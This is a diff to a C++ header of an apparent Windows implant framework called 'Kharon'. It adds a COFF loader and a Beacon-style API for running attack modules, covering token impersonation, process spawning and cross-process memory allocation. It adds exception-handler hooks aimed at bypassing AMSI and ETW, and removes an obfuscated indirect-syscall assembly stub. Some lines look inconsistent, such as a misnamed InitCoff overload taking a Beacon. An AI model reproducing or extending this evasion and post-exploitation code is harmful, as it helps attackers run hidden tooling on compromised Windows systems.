@@ -81,10 +81,6 @@ EXTERN_C UPTR EndPtr();
 #define WEB_HOST {}
 #endif // WEB_HOST
 
-#ifndef WEB_CONN_QUANTITY
-#define WEB_CONN_QUANTITY 1
-#endif // WEB_CONN_QUANTITY
-
 #ifndef WEB_PORT
 #define WEB_PORT {}
 #endif // WEB_PORT
@@ -121,6 +117,8 @@ EXTERN_C UPTR EndPtr();
 #define PIPE_NAME ""
 #endif // PIPE_NAME
 
+class Coff;
+class Beacon;
 class Spoof;
 class Syscall;
 class HwbpEng;
@@ -145,6 +143,10 @@ class Socket;
 #define x64_OPCODE_MOV			0xB8
 #define	x64_SYSCALL_STUB_SIZE   0x20
 
+typedef struct {
+
+} BEACON_INFO, *PBEACON_INFO;
+
 typedef struct JOBS {
     PPACKAGE Pkg;
     PPARSER  Psr;
@@ -166,6 +168,8 @@ namespace Root {
 
     class Kharon {    
     public:
+        Beacon*    Bc;
+        Coff*      Cf;
         HwbpEng*   Hw;
         Spoof*     Spf;
         Syscall*   Sys;
@@ -297,6 +301,9 @@ namespace Root {
         
             DECLAPI( GetComputerNameExA );
         
+            DECLAPI( TlsAlloc );
+            DECLAPI( TlsSetValue );
+            DECLAPI( TlsGetValue );
             DECLAPI( OpenThread );
             DECLAPI( ResumeThread );
             DECLAPI( CreateThread );
@@ -467,6 +474,16 @@ namespace Root {
             DECLAPI( RtlDeleteTimer );
             DECLAPI( RtlCreateTimerQueue );
             DECLAPI( RtlDeleteTimerQueue );
+
+            DECLAPI( RtlAddVectoredExceptionHandler );
+            DECLAPI( RtlAddVectoredContinueHandler );
+            DECLAPI( RtlRemoveVectoredContinueHandler );
+            DECLAPI( RtlRemoveVectoredExceptionHandler );
+
+            DECLAPI( RtlInitializeCriticalSection );
+            DECLAPI( RtlLeaveCriticalSection );
+            DECLAPI( RtlEnterCriticalSection );
+            DECLAPI( RtlDeleteCriticalSection );
         } Ntdll = {
             RSL_TYPE( RtlNtStatusToDosError ),
             RSL_TYPE( DbgPrint ),
@@ -515,6 +532,16 @@ namespace Root {
             RSL_TYPE( RtlDeleteTimer ),
             RSL_TYPE( RtlCreateTimerQueue ),
             RSL_TYPE( RtlDeleteTimerQueue ),
+
+            RSL_TYPE( RtlAddVectoredExceptionHandler ),
+            RSL_TYPE( RtlAddVectoredContinueHandler ),
+            RSL_TYPE( RtlRemoveVectoredContinueHandler ),
+            RSL_TYPE( RtlRemoveVectoredExceptionHandler ),
+
+            RSL_TYPE( RtlInitializeCriticalSection ),
+            RSL_TYPE( RtlLeaveCriticalSection ),
+            RSL_TYPE( RtlEnterCriticalSection ),
+            RSL_TYPE( RtlDeleteCriticalSection ),
         };
            
         struct {
@@ -632,7 +659,8 @@ namespace Root {
             _In_ UPTR Argument
         ) -> VOID;
 
-        VOID InitHwbp( HwbpEng* HwbpRf ) { Hw = HwbpRf; }
+        VOID InitCoff( Coff* CoffRf ) { Cf = CoffRf; }
+        VOID InitCoff( Beacon* BeaconRf ) { Bc = BeaconRf; }
         VOID InitSpoof( Spoof* SpoofRf ) { Spf = SpoofRf; }
         VOID InitSyscall( Syscall* SyscallRf ) { Sys = SyscallRf; }
         VOID InitSocket( Socket* SocketRf ) { Sckt = SocketRf; }
@@ -654,6 +682,218 @@ namespace Root {
     };
 }
 
+class Coff {
+private:
+    Root::Kharon* Self;    
+public:
+    Coff( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
+
+    auto Loader(
+        _In_ PBYTE Buffer,
+        _In_ ULONG Size
+    ) -> BOOL;
+};
+
+typedef struct {
+	PCHAR original;
+	PCHAR buffer; 
+	INT   length;  
+	INT   size;     
+} DATAP, *PDATAP;
+
+typedef struct {
+	PCHAR original; 
+	PCHAR buffer;   
+	INT   length;   
+	INT   size;     
+} FMTP, *PFMTP;
+
+class Beacon {
+private:
+    Root::Kharon* Self;    
+public:
+    Beacon( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
+    
+    PPACKAGE Pkg = { 0 };
+
+    auto DataExtract(
+        PDATAP parser,
+        PINT   size
+    ) -> PCHAR;
+
+    auto DataInt(
+        PDATAP parser
+    ) -> INT;
+
+    auto DataLength(
+        PDATAP parser
+    ) -> INT;
+
+    auto DataShort(
+        PDATAP parser
+    ) -> SHORT;
+
+    auto DataParse(
+        PDATAP parser,
+        PCHAR  buffer,
+        INT    size
+    ) -> VOID;
+
+    auto DataPtr(
+        PDATAP parser, 
+        INT    size
+    ) -> VOID;
+
+    auto FmtAlloc(
+        PFMTP fmt,
+        INT   maxsz
+    ) -> VOID;
+
+    auto FmtAppend(
+        PFMTP fmt
+    ) -> VOID;
+
+    auto FmtFree(
+        PFMTP fmt
+    ) -> VOID;
+
+    auto FmtInt(
+        PFMTP fmt,
+        INT   val
+    ) -> VOID;
+
+    auto FmtPrintf(
+        PFMTP fmt,
+        PCCH  text,
+        INT   len
+    ) -> VOID;
+
+    auto FmtReset(
+        PFMTP fmt
+    ) -> VOID;
+
+    auto FmtToString(
+        PFMTP fmt,
+        PINT  size
+    ) -> PCHAR;
+
+    auto IsAdmin(
+        VOID
+    ) -> BOOL;
+
+    auto UseToken(
+        HANDLE token
+    ) -> BOOL;
+
+    auto RevertToken(
+        VOID
+    ) -> VOID;
+
+    auto GetSpawn(
+        BOOL  x86, 
+        PCHAR buffer,
+        INT   length
+    ) -> VOID;
+
+    auto SpawnTmpProcess(
+        BOOL x86, 
+        BOOL ignoreToken, 
+        STARTUPINFO si, 
+        PPROCESS_INFORMATION pInfo
+    ) -> BOOL;
+
+    auto CleanupProcess(
+        PPROCESS_INFORMATION pinfo
+    ) -> VOID;
+
+    auto DataStoreGetItem(
+
+    );
+
+    auto DataStoreProtectItem(
+
+    );
+
+    auto DataStoreUnprotectItem(
+
+    );
+
+    auto Information(
+        PBEACON_INFO Info
+    );
+
+    auto AddValue(
+        PCCH  key, 
+        PVOID ptr
+    ) -> BOOL;
+
+    auto GetValue(
+        PCCH key
+    ) -> PVOID;
+
+    auto RmValue(
+        PCCH key
+    ) -> BOOL;
+
+    auto Printf(
+        INT  type,
+        PCCH Fmt,
+        ...
+    ) -> VOID;
+
+    auto Output(
+        INT  type,
+        PCCH data,
+        INT  len
+    ) -> VOID;
+
+    auto VirtualAlloc(
+        LPVOID Address, 
+        SIZE_T Size, 
+        DWORD  AllocType, 
+        DWORD  Protect
+    ) -> PVOID; 
+
+    auto VirtualAllocEx(
+        HANDLE Handle,
+        LPVOID Address, 
+        SIZE_T Size, 
+        DWORD  AllocType, 
+        DWORD  Protect
+    ) -> PVOID; 
+
+    auto VirtualProtect(
+        LPVOID Address, 
+        SIZE_T Size, 
+        DWORD  NewProtect, 
+        PDWORD OldProtect
+    ) -> BOOL;
+
+    auto VirtualProtectEx(
+        HANDLE Handle,
+        LPVOID Address, 
+        SIZE_T Size, 
+        DWORD  NewProtect, 
+        PDWORD OldProtect
+    ) -> BOOL;
+    
+    auto OpenProcess(
+        DWORD desiredAccess, 
+        BOOL  inheritHandle, 
+        DWORD processId
+    ) -> HANDLE;
+
+    auto OpenThread(
+        DWORD desiredAccess, 
+        BOOL  inheritHandle, 
+        DWORD threadId
+    ) -> HANDLE;
+
+    auto LoadLibraryA(
+        _In_ PCHAR LibraryName
+    ) -> HMODULE;
+};
+
 class Syscall {
 private:
     Root::Kharon* Self;    
@@ -673,46 +913,6 @@ public:
     auto Fetch(
         _In_ INT8 SysIdx
     ) -> BOOL;
-
-    template<typename... Args>
-    __attribute__((always_inline)) inline auto DECLFN Run(
-        _In_ Args... args
-    ) -> NTSTATUS {
-        NTSTATUS result;
-        void* ssnPtr = &Ext[Index].ssn;
-        void* instPtr = reinterpret_cast<void*>(Ext[Index].Instruction);
-    
-        // Carrega endereços nos registradores
-        asm volatile ("mov %0, %%r14" : : "r"(ssnPtr));
-        asm volatile ("mov %0, %%r15" : : "r"(instPtr));
-    
-        __asm__ __volatile__ (
-            // Ofuscação inicial
-            "xor %%r10, %%r10      \n\t"
-            "mov %%rcx, %%rax      \n\t"
-            "mov %%rax, %%r10      \n\t"
-            
-            // Configuração real
-            "mov (%%r14), %%eax    \n\t"  // Carrega SSN
-            
-            // Mais ofuscação
-            "jmp 1f                \n\t"
-            "xor %%eax, %%eax      \n\t"
-            "xor %%rcx, %%rcx      \n\t"
-            "shl $2, %%r10         \n\t"
-            
-            // Ponto de execução real
-            "1:                    \n\t"
-            "jmp *(%%r15)          \n\t"  // Salto para syscall
-            
-            // Captura resultado (não alcançável diretamente)
-            : "=a" (result)        // NTSTATUS retornado em EAX
-            :                     // Sem inputs explícitos
-            : "memory", "r10", "r14", "r15"
-        );
-    
-        return result;
-    }
 };
 
 class HwbpEng {
@@ -721,22 +921,32 @@ private:
 public:
     HwbpEng( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
-    PDESCRIPTOR_HOOK Threads = nullptr;
-    CRITICAL_SECTION CritSec = { 0 };
+    PDESCRIPTOR_HOOK  Threads = nullptr;
+    PRTL_CRITICAL_SECTION Crt= nullptr;
+    PCRITICAL_SECTION CritSec = nullptr;
 
     BOOL  Enabled     = KH_HARDWARE_BREAKPOINT_ENABLED;
     BOOL  Initialized = FALSE;
     PVOID Handler     = nullptr;
 
     struct {
-        UPTR Handle;
+        PVOID Parameter;
+        ULONG TimerWait;
+    } HookCallbackArg;
+
+    struct {
         UPTR NtTraceEvent;
-    } Etw;
+    } Etw = {
+        .NtTraceEvent = NULL
+    };
 
     struct {
         UPTR Handle;
         UPTR AmsiScanBuffer;
-    } Amsi;
+    } Amsi = {
+        .Handle = NULL,
+        .AmsiScanBuffer = NULL
+    };
 
     auto Init( VOID ) -> BOOL;
     auto Clean( VOID ) -> BOOL;
@@ -795,11 +1005,9 @@ public:
     ) -> VOID;
 
     __forceinline auto static DECLFN HookCallbackThunk(
-        _In_ PVOID Parameter,
-        _In_ BOOL  TimerWait,
         _In_ PVOID This
     ) -> VOID {
-        return static_cast<HwbpEng*>( This )->HookCallback( Parameter, TimerWait );
+        return static_cast<HwbpEng*>( This )->HookCallback( static_cast<HwbpEng*>( This )->HookCallbackArg.Parameter, static_cast<HwbpEng*>( This )->HookCallbackArg.TimerWait );
     }
 
     auto MainHandler( 
@@ -810,6 +1018,7 @@ public:
         _In_ PEXCEPTION_POINTERS e,
         _In_ PVOID               This
     ) -> LONG {
+        This = NtCurrentPeb()->TelemetryCoverageHeader;
         return static_cast<HwbpEng*>( This )->MainHandler( e );
     }
 
